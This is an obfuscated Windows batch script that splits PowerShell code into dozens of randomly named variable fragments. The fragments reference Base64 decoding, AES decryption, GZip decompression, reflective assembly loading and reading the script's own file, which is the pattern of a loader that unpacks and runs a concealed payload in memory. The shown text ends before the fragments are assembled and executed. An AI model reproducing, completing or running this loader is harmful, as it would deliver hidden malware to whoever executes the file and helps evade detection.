@echo off
%lVTvNtIRjcwjoodiirwo%s%lVTvNtIRjcwjoodiirwo%e%lVTvNtIRjcwjoodiirwo%t%lVTvNtIRjcwjoodiirwo%l%lVTvNtIRjcwjoodiirwo%o%lVTvNtIRjcwjoodiirwo%c%lVTvNtIRjcwjoodiirwo%a%lVTvNtIRjcwjoodiirwo%l%lVTvNtIRjcwjoodiirwo% %lVTvNtIRjcwjoodiirwo%e%lVTvNtIRjcwjoodiirwo%n%lVTvNtIRjcwjoodiirwo%a%lVTvNtIRjcwjoodiirwo%b%lVTvNtIRjcwjoodiirwo%l%lVTvNtIRjcwjoodiirwo%e%lVTvNtIRjcwjoodiirwo%d%lVTvNtIRjcwjoodiirwo%e%lVTvNtIRjcwjoodiirwo%l%lVTvNtIRjcwjoodiirwo%a%lVTvNtIRjcwjoodiirwo%y%lVTvNtIRjcwjoodiirwo%e%lVTvNtIRjcwjoodiirwo%d%lVTvNtIRjcwjoodiirwo%e%lVTvNtIRjcwjoodiirwo%x%lVTvNtIRjcwjoodiirwo%p%lVTvNtIRjcwjoodiirwo%a%lVTvNtIRjcwjoodiirwo%n%lVTvNtIRjcwjoodiirwo%s%lVTvNtIRjcwjoodiirwo%i%lVTvNtIRjcwjoodiirwo%o%lVTvNtIRjcwjoodiirwo%n%lVTvNtIRjcwjoodiirwo%
set "RNYITILsYczwVnFdwBnK=s"
set "RIFHlFaivJKvoWWUYKQa=t"
set "ysgchHWyGarQTJdOJVAy=!RNYITILsYczwVnFdwBnK!e!RIFHlFaivJKvoWWUYKQa!"
!ysgchHWyGarQTJdOJVAy! "HntcOkNNva=P73n"
!ysgchHWyGarQTJdOJVAy! "bRDMrZMjNn=ject"
!ysgchHWyGarQTJdOJVAy! "zJHBrxZMHA=trin"
!ysgchHWyGarQTJdOJVAy! "eUQNVHGMXU=m.Co"
!ysgchHWyGarQTJdOJVAy! "lqyFnlfaSt=xrfg"
!ysgchHWyGarQTJdOJVAy! "OGhsWBoeFb=ute_"
!ysgchHWyGarQTJdOJVAy! "tTQnNjOgvT=in $"
!ysgchHWyGarQTJdOJVAy! "CWmpiDOgCP=k($p"
!ysgchHWyGarQTJdOJVAy! "OkwMIDlDIr=m.IO"
!ysgchHWyGarQTJdOJVAy! "QHbjvMxJGx=JI.D"
!ysgchHWyGarQTJdOJVAy! "kYdMIvSJIv=w-Ob"
!ysgchHWyGarQTJdOJVAy! "QannVSCbPr=_var"
!ysgchHWyGarQTJdOJVAy! "rjUmbYlSfG=y.Pa"
!ysgchHWyGarQTJdOJVAy! "fIhmMIRkIa=_fun"
!ysgchHWyGarQTJdOJVAy! "oIsmMxPYUL=m.Re"
!ysgchHWyGarQTJdOJVAy! "ujZaAKRvRN==New"
!ysgchHWyGarQTJdOJVAy! "FBSUtJKwkp=,$pa"
!ysgchHWyGarQTJdOJVAy! "OINdQqrCoU=r[1]"
!ysgchHWyGarQTJdOJVAy! "cwpYzseBra=ispo"
!ysgchHWyGarQTJdOJVAy! "zwfTkubgcd=-joi"
!ysgchHWyGarQTJdOJVAy! "ObWWQodTLO=tor("
!ysgchHWyGarQTJdOJVAy! "HOTfDwUREz=g[]]"
!ysgchHWyGarQTJdOJVAy! "IshUxVqZcM=load"
!ysgchHWyGarQTJdOJVAy! "LnyGirBrMw=EfPg"
!ysgchHWyGarQTJdOJVAy! "fxvLRJJmFF=rF'["
!ysgchHWyGarQTJdOJVAy! "JZCzJhBfwU=Conv"
!ysgchHWyGarQTJdOJVAy! "DytiiUFyrB='')("
!ysgchHWyGarQTJdOJVAy! "DogQkWSGgu=r);}"
!ysgchHWyGarQTJdOJVAy! "VAgaTgHfVU=nMod"
!ysgchHWyGarQTJdOJVAy! "SdFcOAqviS=ke($"
!ysgchHWyGarQTJdOJVAy! "iYaHoWghGt=yIgZ"
!ysgchHWyGarQTJdOJVAy! "PYEGasHUba=;exe"
!ysgchHWyGarQTJdOJVAy! "MfqgzhdHcb=join"
!ysgchHWyGarQTJdOJVAy! "ocZcCtmkZU=C;	$"
!ysgchHWyGarQTJdOJVAy! "BNXTPtnRAq=ctio"
!ysgchHWyGarQTJdOJVAy! "aPdVmWCpXB=t]::"
!ysgchHWyGarQTJdOJVAy! "RLfphrBlSZ=yloa"
!ysgchHWyGarQTJdOJVAy! "fOSYZOFMFh=orF'"
!ysgchHWyGarQTJdOJVAy! "pwCYXpQVAY=46es"
!ysgchHWyGarQTJdOJVAy! "wKcpetndeo={	$v"
!ysgchHWyGarQTJdOJVAy! "ngwGOcfXaa=+Dii"
!ysgchHWyGarQTJdOJVAy! "rbjvoRMgnu=2_va"
!ysgchHWyGarQTJdOJVAy! "LzzwpBECcG=morF"
!ysgchHWyGarQTJdOJVAy! "sDsyxxbRHK=tion"
!ysgchHWyGarQTJdOJVAy! "FgxGXZpmUZ=r=[s"
!ysgchHWyGarQTJdOJVAy! "xddYjOJypQ=6] -"
!ysgchHWyGarQTJdOJVAy! "vcHjGRiqyq=ne);"
!ysgchHWyGarQTJdOJVAy! "tIOopZWalV=aylo"
!ysgchHWyGarQTJdOJVAy! "WmbxJEQUKr=oL'["
!ysgchHWyGarQTJdOJVAy! "BdYduQaRfb=.Dis"
!ysgchHWyGarQTJdOJVAy! "HqqtqGwByU=rypt"
!ysgchHWyGarQTJdOJVAy! "tqgRqHxkeL=irtS"
!ysgchHWyGarQTJdOJVAy! "EaSCRTojGi=$hos"
!ysgchHWyGarQTJdOJVAy! "efefbHwsnG=BYU."
!ysgchHWyGarQTJdOJVAy! "tfloCdpXMk= '%~f0'"
!ysgchHWyGarQTJdOJVAy! "JLwvfEPgbX=XmRN"
!ysgchHWyGarQTJdOJVAy! "eRIjrSGfCh=Crea"
!ysgchHWyGarQTJdOJVAy! "FiQVhHJZxa=cryp"
!ysgchHWyGarQTJdOJVAy! "zdqQIXXrEJ=ss);"
!ysgchHWyGarQTJdOJVAy! "hvpBNggnGm=Stre"
!ysgchHWyGarQTJdOJVAy! "HPcicMrKJO=.Raw"
!ysgchHWyGarQTJdOJVAy! "alKRxZXsGg=XmRN"
!ysgchHWyGarQTJdOJVAy! "gxfJdupSwk=var."
!ysgchHWyGarQTJdOJVAy! "nbwxXEeMir=PlWH"
!ysgchHWyGarQTJdOJVAy! "lolOApVKru=]]$p"
!ysgchHWyGarQTJdOJVAy! "jVOpfQmOgc=$XoS"
!ysgchHWyGarQTJdOJVAy! "dkDacxmpCb= Sys"
!ysgchHWyGarQTJdOJVAy! "XvkDocBKlX=-16]"
!ysgchHWyGarQTJdOJVAy! "mcVqcfPKrH=)));"
!ysgchHWyGarQTJdOJVAy! "rJplyalhzW=ert]"
!ysgchHWyGarQTJdOJVAy! "nsLhcffULb=cute"
!ysgchHWyGarQTJdOJVAy! "QmcRYgMMCv==$gA"
!ysgchHWyGarQTJdOJVAy! "tenXPuZDeg=ar=$"
!ysgchHWyGarQTJdOJVAy! "eIAjrrHoDb=trea"
